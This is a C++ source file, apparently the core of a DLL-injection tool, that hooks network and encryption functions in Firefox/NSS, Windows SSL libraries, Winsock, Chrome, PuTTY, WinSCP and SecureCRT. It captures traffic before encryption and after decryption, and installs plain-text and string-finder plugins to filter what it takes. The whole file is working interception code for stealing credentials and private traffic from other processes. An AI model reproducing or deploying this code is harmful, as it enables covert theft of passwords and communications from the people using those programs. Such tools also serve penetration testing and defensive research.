
#include "stdafx.h"
#include "InjectedDLL.h"
#include "ReflectiveLoader.h"
#include "Utils.h"
#include "Process.h"
#include "Hooker.h"
#include "HookedFunctions.h"
#include "FunctionFlow.h"
#include "DynConfig.h"
#include "NonExportedHooks.h"
#include "PluginSystem.h"
#include "Plugin.h"

// Plugins

void InstallPlugins()
{
	// Plain text plugin
	
	Plugin *plPlain = new Plugin;

	plPlain->ReadCallback  = &Plugin_PlainText;
	plPlain->WriteCallback = &Plugin_PlainText;

	if(DynConfig::GetPlainText().compare("true") == 0 || DynConfig::GetPlainText().compare("TRUE") == 0)
		PluginSystem::InstallPlugin(plPlain);

	// Data limit plugin

	Plugin *plLimit = new Plugin;

	plLimit->ReadCallback  = &Plugin_DataLimit;
	plLimit->WriteCallback = &Plugin_DataLimit;

	plLimit->SetConfig(DynConfig::GetDataLimit());

	PluginSystem::InstallPlugin(plLimit);

	// String finder plugin

	Plugin *plFinder = new Plugin;

	plFinder->ReadCallback  = &Plugin_StringFinder;
	plFinder->WriteCallback = &Plugin_StringFinder;

	plFinder->SetConfig(DynConfig::GetStringFinder());

	PluginSystem::InstallPlugin(plFinder);
}

// Our main function

void Inject()
{
	// Init stuff

	DebugLog::Init();
	FunctionFlow::Init();
	DynConfig::Init();
	
	// Hooks specific to loaded DLLs

	vector<MODULEENTRY32> vDlls = Process::GetProcessModules(0);

	for(size_t i = 0; i < vDlls.size(); i++)
	{
		// PR_Read, PR_Write && PR_Send, PR_Recv

		if(Utils::ToLower(vDlls[i].szModule).compare("nss3.dll") == 0 || Utils::ToLower(vDlls[i].szModule).compare("nspr4.dll") == 0)
		{
			string sModuleName = Utils::ToLower(vDlls[i].szModule);
			
			// PR_Read, PR_Write
			
			PR_Read_Original = (PR_Read_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Read");
			PR_Write_Original = (PR_Write_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Write");
			PR_GetDescType_Original = (PR_GetDescType_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_GetDescType");
	
			Hooker::AddHook((void *)PR_Read_Original, (void *)PR_Read_Callback);
			Hooker::AddHook((void *)PR_Write_Original, (void *)PR_Write_Callback);

			// PR_Send, PR_Recv

			PR_Recv_Original = (PR_Recv_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Recv");
			PR_Send_Original = (PR_Send_Typedef)GetProcAddress(LoadLibrary(sModuleName.c_str()), "PR_Send");
	
			Hooker::AddHook((void *)PR_Recv_Original, (void *)PR_Recv_Callback);
			Hooker::AddHook((void *)PR_Send_Original, (void *)PR_Send_Callback);
		}

		// SslEncryptPacket, SslDecryptPacket

		else if(Utils::ToLower(vDlls[i].szModule).compare("ncrypt.dll") == 0)
		{
			SslEncryptPacket_Original = (SslEncryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslEncryptPacket");
			SslDecryptPacket_Original = (SslDecryptPacket_Typedef)GetProcAddress(LoadLibrary("ncrypt.dll"), "SslDecryptPacket");

			Hooker::AddHook((void *)SslEncryptPacket_Original, (void *)SslEncryptPacket_Callback);
			Hooker::AddHook((void *)SslDecryptPacket_Original, (void *)SslDecryptPacket_Callback);
		}

		// send, recv, WSASend, WSARecv

		else if(Utils::ToLower(vDlls[i].szModule).compare("ws2_32.dll") == 0)
		{
			recv_Original = (recv_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "recv");
			send_Original = (send_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "send");
	
			Hooker::AddHook((void *)recv_Original, (void *)recv_Callback);
			Hooker::AddHook((void *)send_Original, (void *)send_Callback);

			WSARecv_Original = (WSARecv_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "WSARecv");
			WSASend_Original = (WSASend_Typedef)GetProcAddress(LoadLibrary("ws2_32.dll"), "WSASend");
	
			Hooker::AddHook((void *)WSARecv_Original, (void *)WSARecv_Callback);
			Hooker::AddHook((void *)WSASend_Original, (void *)WSASend_Callback);
		}

		// EncryptMessage, DecryptMessage

		else if(Utils::ToLower(vDlls[i].szModule).compare("secur32.dll") == 0)
		{
			EncryptMessage_Original = (EncryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "EncryptMessage");
			DecryptMessage_Original = (DecryptMessage_Typedef)GetProcAddress(LoadLibrary("secur32.dll"), "DecryptMessage");

			Hooker::AddHook((void *)EncryptMessage_Original, (void *)EncryptMessage_Callback);
			Hooker::AddHook((void *)DecryptMessage_Original, (void *)DecryptMessage_Callback);
		}

		// chrome.dll

		else if(Utils::ToLower(vDlls[i].szModule).compare("chrome.dll") == 0)
		{
			// Hook Chrome functions

			HookChrome();
		}

		// putty.exe

		else if(Utils::ToLower(vDlls[i].szModule).compare("putty.exe") == 0)
		{
			// Hook Chrome functions

			HookPutty();
		}

		// WinSCP.exe

		else if(Utils::ToLower(vDlls[i].szModule).compare("winscp.exe") == 0)
		{
			// Hook Chrome functions

			HookWinSCP(); 
		}

		// SecureCRT

		else if (Utils::ToLower(vDlls[i].szModule).compare("ssh2core73u.dll") == 0)
		{
			// Hook SecureCRT function

			SecureCRT_Original = (SecureCRT_Typedef)GetProcAddress(LoadLibrary("ssh2core73u.dll"), "?Get_raw_pointer@SSHPacket@SSH2@@QAE_NAAPAEH@Z");

			Hooker::AddHook((void *)SecureCRT_Original, (void *)SecureCRT_Callback);
		}
	}

	// Install plugins

	InstallPlugins();
} 

// Unhook all hooks

void Unhook()
{
	Hooker::RemoveHooks();
}

